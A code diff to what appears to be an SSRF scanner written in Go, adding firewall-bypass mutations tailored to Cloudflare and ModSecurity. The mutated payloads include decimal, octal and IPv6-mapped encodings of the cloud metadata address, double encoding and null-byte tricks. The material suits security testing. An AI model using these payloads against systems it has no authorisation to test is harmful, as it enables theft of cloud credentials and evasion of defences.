@@ -3,6 +3,8 @@ package payloads
 import (
 	"fmt"
 	"strings"
+
+	"ssrf-detector/internal/waf"
 )
 
 // Payload represents one generated test payload.
@@ -16,10 +18,23 @@ type Payload struct {
 type EnvironmentContext struct {
 	CloudProvider string
 	WAFDetected   bool
+	WAFVendor     string
 	ProxyDetected bool
 	BackendLang   string
 	InternalRange []string
 }
+
+// MutationStrategy identifies a payload mutation for WAF bypass.
+type MutationStrategy string
+
+const (
+	DecimalIP      MutationStrategy = "decimal_ip"
+	IPv6Mapped     MutationStrategy = "ipv6_mapped"
+	CaseMutation   MutationStrategy = "case_mutation"
+	DoubleEncoding MutationStrategy = "double_encoding"
+	NullByteAppend MutationStrategy = "null_byte_append"
+	OctalIP        MutationStrategy = "octal_ip"
+)
 
 // GeneratePayloads builds a context-aware payload set.
 func GeneratePayloads(ctx *EnvironmentContext) []Payload {
@@ -45,8 +60,10 @@ func GeneratePayloads(ctx *EnvironmentContext) []Payload {
 		payloads = append(payloads, azureMetadataPayloads()...)
 	}
 
-	if ctx.WAFDetected {
-		payloads = applyBypassMutations(payloads)
+	if ctx.WAFVendor != "" {
+		payloads = applyBypassMutations(payloads, bypassesForWAF(waf.WAFVendor(strings.ToLower(ctx.WAFVendor))))
+	} else if ctx.WAFDetected {
+		payloads = applyBypassMutations(payloads, nil)
 	}
 
 	switch ctx.BackendLang {
@@ -100,23 +117,43 @@ func azureMetadataPayloads() []Payload {
 	}
 }
 
-func applyBypassMutations(in []Payload) []Payload {
+func bypassesForWAF(vendor waf.WAFVendor) []MutationStrategy {
+	switch vendor {
+	case waf.WAFCloudflare:
+		return []MutationStrategy{DecimalIP, IPv6Mapped, CaseMutation}
+	case waf.WAFModSecurity:
+		return []MutationStrategy{DoubleEncoding, NullByteAppend, OctalIP}
+	default:
+		return []MutationStrategy{CaseMutation, DoubleEncoding}
+	}
+}
+
+func applyBypassMutations(in []Payload, strategies []MutationStrategy) []Payload {
 	mutated := make([]Payload, 0, len(in)*2)
 	mutated = append(mutated, in...)
+	if len(strategies) == 0 {
+		strategies = []MutationStrategy{CaseMutation, DoubleEncoding}
+	}
 	for _, p := range in {
 		if p.Category != "cloud_metadata" && p.Category != "fetch" {
 			continue
 		}
-		mutated = append(mutated, Payload{
-			Name:     p.Name + "-at-bypass",
-			Category: p.Category,
-			Value:    "http://example.com@{{OOB}}/bypass",
-		})
-		mutated = append(mutated, Payload{
-			Name:     p.Name + "-double-encoded",
-			Category: p.Category,
-			Value:    "http:%252f%252f{{OOB}}%252fbypass",
-		})
+		for _, s := range strategies {
+			switch s {
+			case DecimalIP:
+				mutated = append(mutated, Payload{Name: p.Name + "-decimal-ip", Category: p.Category, Value: "http://2852039166/"})
+			case IPv6Mapped:
+				mutated = append(mutated, Payload{Name: p.Name + "-ipv6-mapped", Category: p.Category, Value: "http://[::ffff:169.254.169.254]/"})
+			case CaseMutation:
+				mutated = append(mutated, Payload{Name: p.Name + "-case-mutation", Category: p.Category, Value: "hTtP://{{OOB}}/bypass"})
+			case DoubleEncoding:
+				mutated = append(mutated, Payload{Name: p.Name + "-double-encoded", Category: p.Category, Value: "http:%252f%252f{{OOB}}%252fbypass"})
+			case NullByteAppend:
+				mutated = append(mutated, Payload{Name: p.Name + "-nullbyte", Category: p.Category, Value: "http://{{OOB}}%00.example.com/"})
+			case OctalIP:
+				mutated = append(mutated, Payload{Name: p.Name + "-octal-ip", Category: p.Category, Value: "http://0251.0376.0251.0376/"})
+			}
+		}
 	}
 	return mutated
 }
